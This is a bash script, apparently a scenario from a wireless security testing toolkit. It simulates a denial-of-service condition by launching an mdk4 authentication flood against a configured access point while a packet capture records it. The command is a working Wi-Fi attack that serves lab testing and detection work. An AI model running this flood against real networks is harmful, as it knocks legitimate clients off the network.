#!/bin/bash

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
SCENARIO_DIR="$BASH_DIR/scenarios"
SERVICES_DIR="$BASH_DIR/services"
UTILITIES_DIR="$BASH_DIR/utilities"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/t009.conf"

# ─── Dependencies ───
source "$HELPERS_DIR/fn_mode.sh"
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_prompt.sh"

# ─── Show Introduction ───
print_none "This scenario simulates a denial of service condition by sending a rapid stream of fake authentication requests to a target access point.  This can overload the AP's association table or CPU resources, disrupting service for legitimate clients."

confirmation

# ─── Show Pre-reqs ───
print_section "Scenario Pre-requisites"
print_none "1. WPA2-PSK Access Point with associated client"
print_none "2. WSTT full/filtered capture"
print_blank

# ─── Show Parameters ───
print_section "Simulation Parameters"
print_none "Threat    : $T009_NAME ($T009_ID)"
print_none "Interface : $INTERFACE"
print_none "Tool      : $T009_TOOL"
print_none "Mode      : $T009_MODE"
print_none "PPS       : $T009_AUTH_PPS"

confirmation

# ─── Show AP Config ───
print_section "Access Point / Client Preparation"
print_action "Launch Access Point"
print_none "BSSID     : $T009_BSSID"
print_none "Channel   : $T009_CHANNEL"

confirmation

# ─── Show Capture Config ───
print_section "WSTT Capture Preparation"
print_action "Launch a full or filtered capture using WSTT"
print_none "BSSID     : $T009_BSSID"
print_none "Channel   : $T009_CHANNEL"
print_none "Duration  : $T009_DURATION seconds"

confirmation

# ─── Run Simulation ───
clear
print_section "Simulation Running"

ensure_monitor_mode
print_blank
print_waiting "Launching Authentication Flood"
sudo timeout "$T009_DURATION" mdk4 "$INTERFACE" a -a "$T009_BSSID" -s "$T009_AUTH_PPS"
EXIT_CODE=$?
ensure_managed_mode

print_blank

if (( EXIT_CODE == 0 )); then
    print_success "Simulation completed"
else
    print_fail "Simulation stopped (Code: $EXIT_CODE)"
fi

exit 0